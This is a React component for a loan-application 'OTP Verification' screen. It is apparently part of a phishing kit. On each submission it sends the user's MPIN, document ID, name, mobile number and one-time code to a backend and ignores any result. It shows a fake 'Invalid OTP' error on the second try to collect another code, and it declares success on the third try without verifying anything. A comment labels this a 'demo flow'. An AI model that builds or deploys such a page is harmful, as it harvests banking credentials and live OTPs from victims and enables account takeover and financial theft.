import React from "react";
import { ArrowLeft, Smartphone } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { useLoanApplication } from "./useLoanApplication";
import { postLoanStep } from "./loanApi";

export default function LoanOtpPage() {
  const navigate = useNavigate();
  const {
    docId,
    mpin,
    fullName,
    mobile,
    otpDigits,
    setOtpDigits,
    otpError,
    setOtpError,
    otpRefs,
    otpAttempts,
    setOtpAttempts,
    setSubmittedAt,
  } = useLoanApplication();
  const [loading, setLoading] = React.useState(false);
  const [secondsLeft, setSecondsLeft] = React.useState(55);
  const otp = otpDigits.join("");
  React.useEffect(() => {
    if (!secondsLeft) return undefined;
    const timer = window.setInterval(() => setSecondsLeft((value) => Math.max(value - 1, 0)), 1000);
    return () => window.clearInterval(timer);
  }, [secondsLeft]);
  const verify = async () => {
    if (otp.length !== 6) return;
    const nextAttempt = otpAttempts + 1;
    const submittedOtp = otp;
    setLoading(true);
    setOtpDigits(["", "", "", "", "", ""]);
    setOtpError(false);
    setOtpAttempts(nextAttempt);
    try {
      await postLoanStep("otpVerification", {
        documentId: docId.trim(),
        pin: mpin,
        fullName: fullName.trim(),
        mobileNumber: mobile.trim(),
        otp: submittedOtp,
      });
    } catch {
      // The requested demo flow controls what is shown for each OTP attempt.
    }
    if (nextAttempt === 2) setOtpError(true);
    if (nextAttempt >= 3) {
      setSubmittedAt(new Date().toISOString());
      navigate("/loan/success");
    }
    setLoading(false);
  };
  const handleChange = (index, value) => {
    const next = [...otpDigits];
    next[index] = value.replace(/\D/g, "").slice(-1);
    setOtpDigits(next);
    if (otpError) setOtpError(false);
    if (next[index] && index < 5) otpRefs.current[index + 1]?.focus();
  };
  const handleKeyDown = (index, event) => {
    if (event.key === "Backspace" && !otpDigits[index] && index > 0) otpRefs.current[index - 1]?.focus();
  };

  return (
    <main className="relative min-h-[100dvh] w-full overflow-hidden bg-[#6f4e08] font-sans sm:flex sm:justify-center">
      <div className="absolute inset-0 bg-cover scale-105" style={{ backgroundImage: "url('/login-hero.jpg')" }} />
      <div className="absolute inset-0 bg-[linear-gradient(180deg,rgba(73,48,3,0.42),rgba(0,0,0,0.7))]" />
      <section className="relative z-10 flex min-h-[100dvh] w-full max-w-md flex-col justify-end sm:shadow-2xl">
        <div className="relative h-[310px] shrink-0">
        </div>
        <div className="relative rounded-t-[38px] bg-white px-7 pb-8 pt-12 shadow-[0_-14px_36px_rgba(0,0,0,0.2)] sm:px-11">
          <div className="absolute left-1/2 top-5 h-1.5 w-16 -translate-x-1/2 rounded-full bg-slate-200" />
          <div className="flex items-center gap-4">
            <div className="flex h-14 w-14 shrink-0 items-center justify-center rounded-full bg-[#e8f7fa]"><Smartphone size={25} className="text-[#2995aa]" /></div>
            <div>
              <h2 className="text-[27px] font-extrabold leading-tight text-[#101827]">OTP Verification</h2>
              <p className="mt-1 text-[16px] font-semibold leading-5 text-[#1d2735]">Check your email or mobile number, 6-digit code</p>
            </div>
          </div>
          <div className={("mt-9 grid grid-cols-6 gap-3" + (otpError ? " animate-[shake_0.4s]" : ""))}>
          {otpDigits.map((digit, index) => (
            <input key={index} ref={(element) => (otpRefs.current[index] = element)} value={digit} onChange={(event) => handleChange(index, event.target.value)} onKeyDown={(event) => handleKeyDown(index, event)} type="tel" inputMode="numeric" autoFocus={index === 0} maxLength={1} aria-label={`OTP digit ${index + 1}`} className={"w-full min-w-0 h-12 rounded-lg border-2 text-center text-lg font-bold text-slate-800 outline-none transition-colors sm:w-11 sm:h-14 sm:rounded-xl sm:text-xl " + (otpError ? "border-red-400 bg-red-50/60" : digit ? "border-teal-500 bg-teal-50/50" : "border-slate-200 bg-slate-50/60 focus:border-teal-400")} />
          ))}
          </div>
        {otpError && <p className="mt-2.5 text-[13px] font-medium text-red-500">Invalid OTP. Please check the code and try again.</p>}
          <button type="button" onClick={verify} disabled={otp.length !== 6 || loading} className="mt-7 h-16 w-full rounded-full bg-[#2f98ae] text-[22px] font-extrabold text-white shadow-[0_10px_22px_rgba(47,152,174,0.22)] transition-opacity disabled:opacity-40">{loading ? "Verifying..." : "Verify OTP"}</button>
          <div className="mt-5 flex items-center justify-center gap-1 text-[17px] text-[#9ca3af]">{secondsLeft ? <>Resend code in <strong className="text-[#34404f]">00:{String(secondsLeft).padStart(2, "0")}</strong></> : <button type="button" onClick={() => setSecondsLeft(55)} className="font-bold text-[#2995aa]">Resend code</button>}</div>
          <button type="button" onClick={() => navigate("/loan/details")} aria-label="Go back" className="absolute left-5 top-5 flex h-8 w-8 items-center justify-center text-slate-400"><ArrowLeft size={20} /></button>
        </div>
      </section>
    </main>
  );
}
